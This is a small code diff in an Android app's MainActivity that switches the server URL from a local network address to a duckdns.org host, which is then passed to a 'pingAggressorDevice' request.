@@ -118,7 +118,7 @@ public class MainActivity extends AppCompatActivity {
                     show();
         }
 
-        String url_server = "http://10.159.3.223:3000";
+        String url_server = "http://4tl4s.duckdns.org:8000";
 
         Request.pingAggressorDevice(data, url_server);
     }
